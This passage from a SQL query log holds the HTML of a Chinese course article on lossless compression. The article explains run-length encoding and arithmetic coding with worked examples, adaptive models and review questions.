data-key="636"> <span data-slate-object="text" data-key="637"><span data-slate-leaf="true" 
data-offset-key="637:0" data-first-offset="true"><span data-slate-string="true">AAAAABBCDDDDDDD</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-854614a5 " data-slate-type="paragraph" data-slate-object="block" data-key="638"> 
<span data-slate-object="text" data-key="639"><span data-slate-leaf="true" data-offset-key="639:0" 
data-first-offset="true"><span data-slate-string="true">它就可以使用 RLE 的方式编码成：</span></span></span> 
</div> <div class="se-645c8bc6 se-12e11061" data-slate-type="pre" data-slate-object="block" 
data-key="640"> <div class="se-23f82d5c se-84d58997"> <span></span> </div> <div class="se-84f62f17"> 
<div class="se-4473d8f4 se-f93eb7e4" data-code-line-number="1"></div> </div> <div class="se-dfdb5de6 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="641"> <span data-slate-object="text" data-key="642"><span data-slate-leaf="true" 
data-offset-key="642:0" data-first-offset="true"><span data-slate-string="true">5A2B1C7D</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-a427bcd3 " data-slate-type="paragraph" data-slate-object="block" data-key="643"> 
<span data-slate-object="text" data-key="644"><span data-slate-leaf="true" data-offset-key="644:0" 
data-first-offset="true"><span data-slate-string="true">这表示这段原数据中有 5 个连续的 A，2 个连续的 B，1 个 C 
和 7 个连续的 D。</span></span></span> </div> <div class="se-f9270ab8 " data-slate-type="paragraph" 
data-slate-object="block" data-key="645"> <span data-slate-object="text" data-key="646"><span 
data-slate-leaf="true" data-offset-key="646:0" data-first-offset="true"><span data-slate-string="true">这种方式下，不知你是否想到，也可能存在问题。比如说，如果连续字符重复的比率很低，像是这样一段字符：</span></span></span> 
</div> <div class="se-b2e25f60 se-779858f2" data-slate-type="pre" data-slate-object="block" 
data-key="647"> <div class="se-09cc1905 se-9a5d8d22"> <span></span> </div> <div class="se-54b6894b"> 
<div class="se-bf54310e se-da9bdcab" data-code-line-number="1"></div> </div> <div class="se-253503bc 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="648"> <span data-slate-object="text" data-key="649"><span data-slate-leaf="true" 
data-offset-key="649:0" data-first-offset="true"><span data-slate-string="true">ABCDABCD</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-56118c46 " data-slate-type="paragraph" data-slate-object="block" data-key="650"> 
<span data-slate-object="text" data-key="651"><span data-slate-leaf="true" data-offset-key="651:0" 
data-first-offset="true"><span data-slate-string="true">按照刚才的规则，它就会被编码成：</span></span></span> 
</div> <div class="se-fd9ac9c6 se-e6a976c3" data-slate-type="pre" data-slate-object="block" 
data-key="652"> <div class="se-36e26c53 se-48c90d92"> <span></span> </div> <div class="se-951355f6"> 
<div class="se-08d5ea39 se-6c6d2694" data-code-line-number="1"></div> </div> <div class="se-7061cf7a 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="653"> <span data-slate-object="text" data-key="654"><span data-slate-leaf="true" 
data-offset-key="654:0" data-first-offset="true"><span data-slate-string="true">1A1B1C1D1A1B1C1D</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-5fa1ba95 " data-slate-type="paragraph" data-slate-object="block" data-key="655"> 
<span data-slate-object="text" data-key="656"><span data-slate-leaf="true" data-offset-key="656:0" 
data-first-offset="true"><span data-slate-string="true">什么嘛，编码后居然比原字符串还长！</span></span></span> 
</div> <div class="se-cba85f17 " data-slate-type="paragraph" data-slate-object="block" data-key="657"> 
<span data-slate-object="text" data-key="658"><span data-slate-leaf="true" data-offset-key="658:0" 
data-first-offset="true"><span class="se-0948c45c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">因此，RLE 这种压缩编码方式，更适合于连续字符发生率较高的数据。</span></span></span></span><span 
data-slate-object="text" data-key="659"><span data-slate-leaf="true" data-offset-key="659:0" 
data-first-offset="true"><span data-slate-string="true">比方说黑白的栅格图像（关于栅格图像的概念，你可以参考 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="660" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="661"><span data-slate-leaf="true" data-offset-key="661:0" 
data-first-offset="true"><span data-slate-string="true">[第 18 讲]</span></span></span></a><span 
data-slate-object="text" data-key="662"><span data-slate-leaf="true" data-offset-key="662:0" 
data-first-offset="true"><span data-slate-string="true">），里面往往存在着大片大片的重复字符。</span></span></span> 
</div> <h2 class="se-22902359" data-slate-type="heading" data-slate-object="block" data-key="663"><span 
data-slate-object="text" data-key="664"><span data-slate-leaf="true" data-offset-key="664:0" 
data-first-offset="true"><span data-slate-string="true">算术编码</span></span></span></h2> <div 
class="se-3cb5df4f " data-slate-type="paragraph" data-slate-object="block" data-key="665"> 
<span data-slate-object="text" data-key="666"><span data-slate-leaf="true" data-offset-key="666:0" 
data-first-offset="true"><span data-slate-string="true">算术编码，即 Arithmetic Coding，我们可以拿它和哈夫曼编码比较起来看：二者都会根据字符的出现频率来设定编码规则，但哈夫曼编码针对的单位是单个字符，每个字符对应一个数；而算术编码，则是整个消息串（编码单元）编码成一个数。</span></span></span> 
</div> <div class="se-411a7339 " data-slate-type="paragraph" data-slate-object="block" data-key="667"> 
<span data-slate-object="text" data-key="668"><span data-slate-leaf="true" data-offset-key="668:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，某数据可能由四个字母组成，每个字母出现的概率如下：</span></span></span> 
</div> <div class="se-bcc86424" data-slate-type="image" data-slate-object="block" data-key="669"> 
<img class="se-ebe9d356" src="https://static001.geekbang.org/resource/image/2c/a2/2c0eb01a4b13fc3fd7e3f49da3ecd6a2.jpg"> 
</div> <div class="se-85dbaee7 " data-slate-type="paragraph" data-slate-object="block" data-key="670"> 
<span data-slate-object="text" data-key="671"><span data-slate-leaf="true" data-offset-key="671:0" 
data-first-offset="true"><span data-slate-string="true">根据上面的统计，假如说现在我们要给单词 eat 来进行算术编码。</span></span></span> 
</div> <div class="se-c8cfd10a " data-slate-type="paragraph" data-slate-object="block" data-key="672"> 
<span data-slate-object="text" data-key="673"><span data-slate-leaf="true" data-offset-key="673:0" 
data-first-offset="true"><span data-slate-string="true">第一步：我们先把 0 到 1 的范围按照该比例划分成这样 4 个区域，第一个字母 
e 就在从 60% 到 100% 的位置（每一个区域，都是左闭右开的区间，比如 t 的区间是 [0, 10%)）。</span></span></span> </div> <div 
class="se-32f8cf94" data-slate-type="image" data-slate-object="block" data-key="674"> <img 
class="se-23b994df" src="https://static001.geekbang.org/resource/image/e4/48/e417f178a506359ae9db6ebfbdb9d548.jpg"> 
</div> <div class="se-65e7ddf1 " data-slate-type="paragraph" data-slate-object="block" data-key="675"> 
<span data-slate-object="text" data-key="676"><span data-slate-leaf="true" data-offset-key="676:0" 
data-first-offset="true"><span data-slate-string="true">第二步：接下来是字母 a，我们把上面 e 这个区域，即 [60%, 100%)，按照同样的比例划分成 
4 个区域，根据同样的计算，a 的位置在 72% 到 84% 这一段上。</span></span></span> </div> <div class="se-e4bbf59d" data-slate-type="image" 
data-slate-object="block" data-key="677"> <img class="se-9c5e6cbb" src="https://static001.geekbang.org/resource/image/b8/e6/b8638c5efae09d9fe98d11bc79e169e6.jpg"> 
</div> <div class="se-5a3a1cff " data-slate-type="paragraph" data-slate-object="block" data-key="678"> 
<span data-slate-object="text" data-key="679"><span data-slate-leaf="true" data-offset-key="679:0" 
data-first-offset="true"><span data-slate-string="true">第三步：最后是字母 t，做法也依然如此，把上面 a 这个区域按照同一比例划分成 
4 个 区域，t 的位置在 72% 到 73.2% 这一段区域内。</span></span></span> </div> <div class="se-12362bc1" data-slate-type="image" 
data-slate-object="block" data-key="680"> <img class="se-e806b4c8" src="https://static001.geekbang.org/resource/image/30/bc/30e8587b0176b4f0f92677585ddaf6bc.jpg"> 
</div> <div class="se-00d4082f " data-slate-type="paragraph" data-slate-object="block" data-key="681"> 
<span data-slate-object="text" data-key="682"><span data-slate-leaf="true" data-offset-key="682:0" 
data-first-offset="true"><span data-slate-string="true">那么，我们就可以给它取 73%，因为它就在最后的区域 t 内，当然，在编码中我们可以去掉百分号。因此，基于上面的统计，eat 
这个单词，就可以采用算术编码成数值 73。也就是说，通过这种方法，</span></span></span><span data-slate-object="text" data-key="683"><span 
data-slate-leaf="true" data-offset-key="683:0" data-first-offset="true"><span class="se-a77afa57" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">一段编码前的数据，最后编码成了一个数。</span></span></span></span> 
</div> <div class="se-05cef60d " data-slate-type="paragraph" data-slate-object="block" data-key="684"> 
<span data-slate-object="text" data-key="685"><span data-slate-leaf="true" data-offset-key="685:0" 
data-first-offset="true"><span data-slate-string="true">这就是算术编码的大致原理，根据已知的统计，将给定数据段进行划分，原则就是让出现概率较大的字符根据比例来分配到相对更大的数据段，解码方根据编码方提供的这一依赖统计数据，就可以做出准确的解码。</span></span></span> 
</div> <div class="se-3c6ee46e " data-slate-type="paragraph" data-slate-object="block" data-key="686"> 
<span data-slate-object="text" data-key="687"><span data-slate-leaf="true" data-offset-key="687:0" 
data-first-offset="true"><span data-slate-string="true">当然，上面作为一个示例，是做了相当的简化了的，在实际应用中，还有很多因素需要我们考虑，比如：</span></span></span> 
</div> <div class="se-2ef2eaab " data-slate-type="paragraph" data-slate-object="block" data-key="688"> 
<span data-slate-object="text" data-key="689"><span data-slate-leaf="true" data-offset-key="689:0" 
data-first-offset="true"><span class="se-e52a22f3" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 采用二进制来代替十进制</span></span></span></span> </div> <div class="se-a934983a 
" data-slate-type="paragraph" data-slate-object="block" data-key="690"> <span data-slate-object="text" 
data-key="691"><span data-slate-leaf="true" data-offset-key="691:0" data-first-offset="true"><span 
data-slate-string="true">我们使用十进制，仅仅是示例之用，为了便于让你理解。实际上，使用二进制可以减小“浪费”的字符，从而缩短编码后的长度，提高压缩比。我们还是拿上面的那个例子来说，72% 
和 73% 在数值位数长度相同的情况下都可以表示 eat 这个词，这就是一定程度上的浪费。</span></span></span><span data-slate-object="text" 
data-key="692"><span data-slate-leaf="true" data-offset-key="692:0" data-first-offset="true"><span 
class="se-88f1576b" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">最理想的状况，应当是用于压缩后数据表达的数值，可以按照比例“恰好”地去覆盖所有被编码的数据组合——而不存在某一种表达是冗余的，或者说对应的被编码的实际数据组合不存在。</span></span></span></span> 
</div> <div class="se-9fc4d6ea " data-slate-type="paragraph" data-slate-object="block" data-key="693"> 
<span data-slate-object="text" data-key="694"><span data-slate-leaf="true" data-offset-key="694:0" 
data-first-offset="true"><span class="se-c881e5b4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. 引入结束字符</span></span></span></span> </div> <div class="se-a366c9d6 
" data-slate-type="paragraph" data-slate-object="block" data-key="695"> <span data-slate-object="text" 
data-key="696"><span data-slate-leaf="true" data-offset-key="696:0" data-first-offset="true"><span 
data-slate-string="true">通常我们不会把整个输入完全使用一个编码数值来表示，而是将输入根据某种规则划分成若干个部分，分别采用算术编码处理。比如一段英文文字，就可以使用空格来标识每一个单词的结束，因此像空格这样的“结束符”需要考虑到编码字符内。</span></span></span> 
</div> <div class="se-5f659bcc " data-slate-type="paragraph" data-slate-object="block" data-key="697"> 
<span data-slate-object="text" data-key="698"><span data-slate-leaf="true" data-offset-key="698:0" 
data-first-offset="true"><span class="se-99a5e53d" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">3. 适当考虑条件概率</span></span></span></span> </div> <div class="se-42536afe 
" data-slate-type="paragraph" data-slate-object="block" data-key="699"> <span data-slate-object="text" 
data-key="700"><span data-slate-leaf="true" data-offset-key="700:0" data-first-offset="true"><span 
data-slate-string="true">你看，上面例子中的第一步、第二步和第三步，t、d、a、e 的分布都是一样的，但是实际上，这个分布在“前一个”字母确定的情况下，是可以有变化的。举个例子，前面提到的字母概率分布，在“前一个字母为 
t”的前提下，当前字母的概率遵循如下表格：</span></span></span> </div> <div class="se-0111eff7" data-slate-type="image" 
data-slate-object="block" data-key="701"> <img class="se-d0840c40" src="https://static001.geekbang.org/resource/image/0a/55/0aa89490dad355f80853db5f3c884f55.jpg"> 
</div> <div class="se-7f61f5b8 " data-slate-type="paragraph" data-slate-object="block" data-key="702"> 
<span data-slate-object="text" data-key="703"><span data-slate-leaf="true" data-offset-key="703:0" 
data-first-offset="true"><span data-slate-string="true">你可以看到，这个条件下的统计和前文比，发生了明显的变化，我们说它是“1 
级”条件概率。如果我们讨论，在前两个字母分别是 t 和 e 的前提下，接着看第三个字母的概率分布，这时的条件概率其实就到“2 级”了。</span></span></span> </div> 
<div class="se-dfee5cba " data-slate-type="paragraph" data-slate-object="block" data-key="704"> 
<span data-slate-object="text" data-key="705"><span data-slate-leaf="true" data-offset-key="705:0" 
data-first-offset="true"><span data-slate-string="true">你也可以想象，由于排列组合的关系，我们不可能无限地考虑条件概率，考虑 
n 级条件概率，这个编码表的大小就是最初编码表大小的 n 次方，因此条件概率的选择，</span></span></span><span data-slate-object="text" 
data-key="706"><span data-slate-leaf="true" data-offset-key="706:0" data-first-offset="true"><span 
class="se-61fe6aa9" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">我们要么选择某几个特定字母（规则）的条件概率</span></span></span></span><span 
data-slate-object="text" data-key="707"><span data-slate-leaf="true" data-offset-key="707:0" 
data-first-offset="true"><span data-slate-string="true">，比如我们只考虑字母 t 和字母 d 的条件概率；</span></span></span><span 
data-slate-object="text" data-key="708"><span data-slate-leaf="true" data-offset-key="708:0" 
data-first-offset="true"><span class="se-4f6300f7" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">要么严格限制条件概率的级数</span></span></span></span><span data-slate-object="text" 
data-key="709"><span data-slate-leaf="true" data-offset-key="709:0" data-first-offset="true"><span 
data-slate-string="true">，比如就实现 1 或 2 级的条件概率。</span></span></span> </div> <div class="se-a19ce7a7 
" data-slate-type="paragraph" data-slate-object="block" data-key="710"> <span data-slate-object="text" 
data-key="711"><span data-slate-leaf="true" data-offset-key="711:0" data-first-offset="true"><span 
class="se-0dc30e55" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">4. 
将静态模型改进为自适应模型</span></span></span></span> </div> <div class="se-791e3146 " data-slate-type="paragraph" 
data-slate-object="block" data-key="712"> <span data-slate-object="text" data-key="713"><span 
data-slate-leaf="true" data-offset-key="713:0" data-first-offset="true"><span data-slate-string="true">算术编码需要在统计数据的指导下进行，我们当然希望统计数据可以精确。我们的例子中，统计信息是预先确定的，即什么字母的出现概率是百分之几都是已经知道的。也就是说，我们应用的是“静态模型”，对于静态模型来说，我们可以相对容易地追求最佳的压缩比。</span></span></span> 
</div> <div class="se-4966b438 " data-slate-type="paragraph" data-slate-object="block" data-key="714"> 
<span data-slate-object="text" data-key="715"><span data-slate-leaf="true" data-offset-key="715:0" 
data-first-offset="true"><span data-slate-string="true">但是在实际应用中，很多时候我们是不知道这个的，或者说，即便知道，这个值也是在不断变化的。使用静态模型的问题也就在这里，</span></span></span><span 
data-slate-object="text" data-key="716"><span data-slate-leaf="true" data-offset-key="716:0" 
data-first-offset="true"><span class="se-184f7776" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">如果用一个静态的统计去指导一个动态变化的问题，就像刻舟求剑一样，哪怕一开始编码是高效的，很快这个压缩率就降下来了。</span></span></span></span> 
</div> <div class="se-e225a1d8 " data-slate-type="paragraph" data-slate-object="block" data-key="717"> 
<span data-slate-object="text" data-key="718"><span data-slate-leaf="true" data-offset-key="718:0" 
data-first-offset="true"><span data-slate-string="true">因此我们经常需要把静态模型变成自适应模型。如果还是前面那个例子显示的四个字母，假如说在一开始的时候 
，这些字母将在待编码的数据中出现的概率是未知的，那么我们可以简单地认为“每个字母都已经出现了 1 次”：</span></span></span> </div> <div class="se-08bb6697" 
data-slate-type="image" data-slate-object="block" data-key="719"> <img class="se-e3166422" 
src="https://static001.geekbang.org/resource/image/4a/0f/4aa648466c77541dc3dbe492713a1c0f.jpg"> 
</div> <div class="se-8908d1aa " data-slate-type="paragraph" data-slate-object="block" data-key="720"> 
<span data-slate-object="text" data-key="721"><span data-slate-leaf="true" data-offset-key="721:0" 
data-first-offset="true"><span data-slate-string="true">那么，随着我们的编码流程向下进行，每次编码，或者每几次编码前这个概率统计，就会根据当前情况得到更新，再来指导下面的编码，不过算法和前面保持不变。</span></span></span> 
</div> <div class="se-3bdd7d08 " data-slate-type="paragraph" data-slate-object="block" data-key="722"> 
<span data-slate-object="text" data-key="723"><span data-slate-leaf="true" data-offset-key="723:0" 
data-first-offset="true"><span data-slate-string="true">比如读入第一个字符 e 以后，这个统计表格就变成了：</span></span></span> 
</div> <div class="se-9907c758" data-slate-type="image" data-slate-object="block" data-key="724"> 
<img class="se-121f8d8e" src="https://static001.geekbang.org/resource/image/eb/94/eb06f5f5601d6ceb251663c7b9530e94.jpg"> 
</div> <div class="se-e0cad127 " data-slate-type="paragraph" data-slate-object="block" data-key="725"> 
<span data-slate-object="text" data-key="726"><span data-slate-leaf="true" data-offset-key="726:0" 
data-first-offset="true"><span data-slate-string="true">再读入一个字符 a，这个统计表格就变成了：</span></span></span> 
</div> <div class="se-60805e3a" data-slate-type="image" data-slate-object="block" data-key="727"> 
<img class="se-a2e8b74b" src="https://static001.geekbang.org/resource/image/a3/80/a335ecf918c0e0dca74c479df9b37080.jpg"> 
</div> <div class="se-e88283f1 " data-slate-type="paragraph" data-slate-object="block" data-key="728"> 
<span data-slate-object="text" data-key="729"><span data-slate-leaf="true" data-offset-key="729:0" 
data-first-offset="true"><span data-slate-string="true">你看，随着编码的不断进行，这个统计表格会不断自我修正。如果源数据的字母分布在数据量增大的时候是收敛的，即不断趋近于某一个相应的比例，那么这个统计也会不断接近它，因此</span></span></span><span 
data-slate-object="text" data-key="730"><span data-slate-leaf="true" data-offset-key="730:0" 
data-first-offset="true"><span class="se-e833955b" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">随着时间的流逝，压缩工作的进行，压缩的效果会越来越好。</span></span></span></span> </div> <div 
class="se-64bb1d6d " data-slate-type="paragraph" data-slate-object="block" data-key="731"> 
<span data-slate-object="text" data-key="732"><span data-slate-leaf="true" data-offset-key="732:0" 
data-first-offset="true"><span class="se-098830ab" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">但是，在很多实际的场景中，这个分布统计并不是收敛的，而是随着时间的流逝会不断变化的。</span></span></span></span><span 
data-slate-object="text" data-key="733"><span data-slate-leaf="true" data-offset-key="733:0" 
data-first-offset="true"><span data-slate-string="true">举例来说，视频直播，随着播放的进行，统计数据需要时不时地发起更新，因为视频在不断变化，某一时间段内重复率高的数据串，可能到了下一个时间段内就变了。这时候，对于统计数据的生成就值得做文章了，比如我们可以选取一个适当的时间权重，</span></span></span><span 
data-slate-object="text" data-key="734"><span data-slate-leaf="true" data-offset-key="734:0" 
data-first-offset="true"><span class="se-34cea226" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">越是新的数据 ，权重越大，这种情况下我们得到的统计就具有一定的即时性了</span></span></span></span><span 
data-slate-object="text" data-key="735"><span data-slate-leaf="true" data-offset-key="735:0" 
data-first-offset="true"><span data-slate-string="true">，而一些较老的数据，显然对于统计分布的影响就很小了，而老到一定程度的数据，甚至就直接忽略掉好了。</span></span></span> 
</div> <div class="se-3993f1bd " data-slate-type="paragraph" data-slate-object="block" data-key="736"> 
<span data-slate-object="text" data-key="737"><span data-slate-leaf="true" data-offset-key="737:0" 
data-first-offset="true"><span data-slate-string="true">于是，通过这种方式，统计数据不断地随着实际数据流的变化而变化，那么编码的规则（编码表）就可以实现不断地自我调整，去适应数据的变化，这也是一些视频流编码都采用自适应模型的原因。</span></span></span> 
</div> <div class="se-1ac6f80a " data-slate-type="paragraph" data-slate-object="block" data-key="738"> 
<span data-slate-object="text" data-key="739"><span data-slate-leaf="true" data-offset-key="739:0" 
data-first-offset="true"><span data-slate-string="true">好，现在我们回过头来看看哈夫曼编码和算术编码，它们尽管在技术实现上有着诸多不同，但是它们的压缩过程，都包含了这样两个步骤，这也是大部分时候我们使用的压缩算法实际上所遵循的两个步骤：</span></span></span> 
</div> <div class="se-fbee8ae6" data-slate-type="list" data-slate-object="block" data-key="740"> 
<div class="se-a5e936e1 se-9544b3d0" data-slate-type="list-line" data-slate-object="block" 
data-key="741"> <span data-slate-object="text" data-key="742"><span data-slate-leaf="true" 
data-offset-key="742:0" data-first-offset="true"><span data-slate-string="true">第一步，分析并计算得到原始数据的统计模型；</span></span></span> 
</div> <div class="se-031327ad se-b0a774fe" data-slate-type="list-line" data-slate-object="block" 
data-key="743"> <span data-slate-object="text" data-key="744"><span data-slate-leaf="true" 
data-offset-key="744:0" data-first-offset="true"><span data-slate-string="true">第二步，根据统计模型，将相对较多出现的数据用较短的编码串表示，而较少出现的数据用较长的编码串表示。</span></span></span> 
</div> </div> <h2 class="se-37e6ebee" data-slate-type="heading" data-slate-object="block" data-key="745"><span 
data-slate-object="text" data-key="746"><span data-slate-leaf="true" data-offset-key="746:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-ae540629 " data-slate-type="paragraph" data-slate-object="block" data-key="747"> 
<span data-slate-object="text" data-key="748"><span data-slate-leaf="true" data-offset-key="748:0" 
data-first-offset="true"><span data-slate-string="true">今天我们学习了无损压缩算法中较为基础的几种，事实上，对于我们日常接触的那些实际的、商用的压缩算法，往往都是这些基础技术的综合使用。好，希望你已经理解了这些算法的本。</span></span></span> 
</div> <div class="se-84d4e7dd " data-slate-type="paragraph" data-slate-object="block" data-key="749"> 
<span data-slate-object="text" data-key="750"><span data-slate-leaf="true" data-offset-key="750:0" 
data-first-offset="true"><span data-slate-string="true">现在又到了提问时间：</span></span></span> </div> 
<div class="se-33ce4dd6" data-slate-type="list" data-slate-object="block" data-key="751"> <div 
class="se-495fb89f se-fd9827c7" data-slate-type="list-line" data-slate-object="block" data-key="752"> 
<span data-slate-object="text" data-key="753"><span data-slate-leaf="true" data-offset-key="753:0" 
data-first-offset="true"><span data-slate-string="true">对比哈夫曼编码和算术编码，你能否比较并分别说出二者的优劣？</span></span></span> 
</div> <div class="se-04fb4b6c se-f22a24c1" data-slate-type="list-line" data-slate-object="block" 
data-key="754"> <span data-slate-object="text" data-key="755"><span data-slate-leaf="true" 
data-offset-key="755:0" data-first-offset="true"><span data-slate-string="true">关于哈夫曼编码，如果编码后的串，其中的某个数值（无论是 
0 还是 1）丢失了，你觉得这样的数据损坏，会导致多大比例的数据无法被正确解码？</span></span></span> </div> </div> <div class="se-0ab0d128 
" data-slate-type="paragraph" data-slate-object="block" data-key="756"> <span data-slate-object="text" 
data-key="757"><span data-slate-leaf="true" data-offset-key="757:0" data-first-offset="true"><span 
data-slate-string="true">你可以回想一下上一讲的选修课堂，和本讲一样，都是将原数据进行某种特定的编码以后，得到目标数据，但是二者的目的是截然不同的，前者是为了加密，保护原始信息不被泄露、不被篡改，而后者是为了压缩，减少存储和传输数据的大小。</span></span></span> 
</div> <div class="se-9734f68f " data-slate-type="paragraph" data-slate-object="block" data-key="758"> 
<span data-slate-object="text" data-key="759"><span data-slate-leaf="true" data-offset-key="759:0" 
data-first-offset="true"><span data-slate-string="true">好，今天就到这里，不知道你是否在全栈开发的算法学习后有所收获，欢迎你和我分享你的思考。</span></span></span> 
</div> <h2 class="se-43e15df4" data-slate-type="heading" data-slate-object="block" data-key="760"><span 
data-slate-object="text" data-key="761"><span data-slate-leaf="true" data-offset-key="761:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-92acca3c" data-slate-type="list" data-slate-object="block" data-key="762"> <div class="se-db3ef86a 
se-7de49761" data-slate-type="list-line" data-slate-object="block" data-key="763"> <span data-slate-object="text" 
data-key="764"><span data-slate-leaf="true" data-offset-key="764:0" data-first-offset="true"><span 
data-slate-string="true">今天我介绍了几个较为基础和经典的无损压缩算法，你可以在这里查看无损压缩的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="765" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="766"><span data-slate-leaf="true" data-offset-key="766:0" data-first-offset="true"><span 
data-slate-string="true">其它算法</span></span></span></a><span data-slate-object="text" data-key="767"><span 
data-slate-leaf="true" data-offset-key="767:0" data-first-offset="true"><span data-slate-string="true">。就如同软件开发没有银弹一样，不同的无损压缩算法擅长于不同的数据类型和特定的数据重复模式，没有一种通用的方法可以对所有的数据压缩都做到最好。</span></span></span> 
</div> <div class="se-403f2051 se-c61d5188" data-slate-type="list-line" data-slate-object="block" 
data-key="768"> <span data-slate-object="text" data-key="769"><span data-slate-leaf="true" 
data-offset-key="769:0" data-first-offset="true"><span data-slate-string="true">对于哈夫曼树的生成，这里有一个</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="770" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="771"><span data-slate-leaf="true" data-offset-key="771:0" 
data-first-offset="true"><span data-slate-string="true">网站</span></span></span></a><span data-slate-object="text" 
data-key="772"><span data-slate-leaf="true" data-offset-key="772:0" data-first-offset="true"><span 
data-slate-string="true">，可以根据你输入的字符串，图形化地展示哈夫曼树。</span></span></span> </div> <div class="se-8222b634 
se-43aba2e3" data-slate-type="list-line" data-slate-object="block" data-key="773"> <span data-slate-object="text" 
data-key="774"><span data-slate-leaf="true" data-offset-key="774:0" data-first-offset="true"><span 
data-slate-string="true">这两讲我介绍了一些全栈开发中重要的算法，但是还有许多其它很有意思、也很有地位的算法，推荐你阅读 InfoQ 上的这篇译文——</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="775" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="776"><span data-slate-leaf="true" data-offset-key="776:0" 
data-first-offset="true"><span data-slate-string="true">计算机科学中最重要的 32 个算法</span></span></span></a><span 
data-slate-object="text" data-key="777"><span data-slate-leaf="true" data-offset-key="777:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-74e4e026" data-slate-type="image" data-slate-object="block" data-key="778"> 
<img class="se-3792e1c2" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 8, 8) 
 {executed in 8 msec}
2020-11-19 11:03:42.224 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=8 
 {executed in 1 msec}
2020-11-19 11:03:42.224 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:03:42.234 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="560" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-096fe4a1 " data-slate-type="paragraph" data-slate-object="block" data-key="561"> 
<span data-slate-object="text" data-key="562"><span data-slate-leaf="true" data-offset-key="562:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-59727eb8 " data-slate-type="paragraph" data-slate-object="block" data-key="563"> 
<span data-slate-object="text" data-key="564"><span data-slate-leaf="true" data-offset-key="564:0" 
data-first-offset="true"><span data-slate-string="true">今天，我们来继续学习一些全栈开发中影响深远的算法，我们这次的归类是无损压缩算法。无损压缩，顾名思义就是经过压缩以后，数据的大小降下来了，但是只要经过还原，原始数据是一点都不丢失的。和无损压缩对应的，显然就叫做“有损压缩”了，它们能够做到在牺牲一定程度原数据质量的基础上，比有损压缩获得额外的压缩比。</span></span></span> 
</div> <div class="se-b3c8873d " data-slate-type="paragraph" data-slate-object="block" data-key="565"> 
<span data-slate-object="text" data-key="566"><span data-slate-leaf="true" data-offset-key="566:0" 
